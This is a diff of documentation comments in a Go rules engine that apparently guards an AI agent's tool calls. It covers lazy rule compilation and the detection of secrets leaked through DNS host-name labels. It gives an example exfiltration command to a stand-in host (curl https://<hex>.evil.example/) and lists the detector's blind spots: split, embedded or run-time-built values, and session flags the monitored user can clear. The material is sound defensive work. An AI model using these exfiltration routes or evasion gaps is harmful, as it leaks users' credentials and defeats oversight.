@@ -27,12 +27,30 @@
 // The embedded packs are also shipped pre-parsed in packs/embedded.cache,
 // because a guard-mode hook is a fresh process per tool call and YAML
 // scanning was two thirds of its start-up (18 ms for 300 rules against a
-// 15 ms budget; 6 ms from the cache). The cache is regenerated with
-// `go generate ./internal/rules` after any change to packs/ or lists.yaml;
-// it records a SHA-256 of the YAML it was made from, LoadEmbedded uses it
-// only on a match and parses the YAML otherwise, and the package tests fail
-// while it is stale. It is embedded rather than written to a user cache
-// directory, which the guarded agent itself could write.
+// 15 ms budget). The cache is regenerated with `go generate
+// ./internal/rules` after any change to packs/ or lists.yaml; it records a
+// SHA-256 of the YAML it was made from, LoadEmbedded uses it only on a
+// match and parses the YAML otherwise, and the package tests fail while it
+// is stale. It is embedded rather than written to a user cache directory,
+// which the guarded agent itself could write.
+//
+// Content served from the cache was compiled whole when the cache was
+// made, so it is compiled lazily at run time (lazy.go): at load only each
+// rule's stub (id, kind, response, flags, the when prefilter), everything
+// Set, GuardSubset and NewEngine need; a rule's body when an engine first
+// reaches it past its prefilter and flags (or Lint, RunTests, Rules ask);
+// its inline tests only for a test run or the linter. The decoder
+// validates every node at load but builds a rule's collection values
+// (match, allow, tests, tags, ...) only on first use, and NewEngine leaves
+// the content hash (Set.Hash, the rules_hash label) to the first
+// detection. Measured with the 138 shipped rules in a fresh process on a
+// shared 4-vCPU VM (minimum / median of 40): LoadEmbedded 11.5 / 14.8 ms
+// before, 2.3 / 3.6 ms after; LoadEmbedded + GuardSubset + NewEngine + the
+// first Eval 13.0 / 16.8 ms before, 4.6 / 5.5 ms after; the same with the
+// full set 23.3 / 27.4 ms before (NewEngine alone 10.6 ms), 5.9 / 8.3 ms
+// after (NewEngine 0.05 ms; the first Eval pays for the bodies it
+// compiles). Content arriving at run time (LoadDir, Load, the YAML
+// fallback) is always compiled whole, so it is rejected at load as before.
 //
 // # Predicates
 //
@@ -121,6 +139,17 @@
 // fingerprints of credential values read from credential-class paths
 // (session.secret_flow is set when one of those values, raw, URL-encoded,
 // base64 or hex, appears in a later outbound command, URL or MCP argument).
+// Host names are scanned label by label for DNS exfiltration (curl
+// https://<hex>.evil.example/, dig, nslookup, ping): every label, labels
+// over 63 bytes also in 63-byte pieces, runs of up to 16 consecutive pieces
+// (512 bytes) joined, raw and decoded as hex, base64, base64url or base32,
+// and runs of whole labels with their dots, raw (a value with dots of its
+// own, a JWT). The label pass runs after the token pass, shortest name
+// first, within the same candidate budget. A raw label counts only for
+// values of 16 bytes or more that are credentials by format or by name; a
+// value kept only for its entropy (a project ref, a bucket name) is often a
+// legitimate subdomain, and a short one an ordinary label, so those count
+// in a label only encoded.
 // The outbound scan is bounded but not blind to padding: strings are
 // scanned shortest first, a string over 64 KiB on its head and tail, only
 // distinct candidates of a remembered value's length are fingerprinted, and
@@ -146,6 +175,10 @@
 //     paths. Private data read through an approved MCP tool and written to
 //     a public sink through MCP touches no secret path and is only covered
 //     by a signal-class co-occurrence rule.
+//   - The value must be a whole label or a run of whole labels: one
+//     embedded with other characters inside a label (x1-<hex>.evil), split
+//     over several commands or queries, or built at run time ($(xxd -p f))
+//     is not matched; values of more than 4 KiB are not fingerprinted.
 //   - Session state of a daemonless hook lives in a file the monitored user
 //     can write; code running as that user can clear its own flags.
 //   - Content hidden behind runtime assembly (eval of built strings,
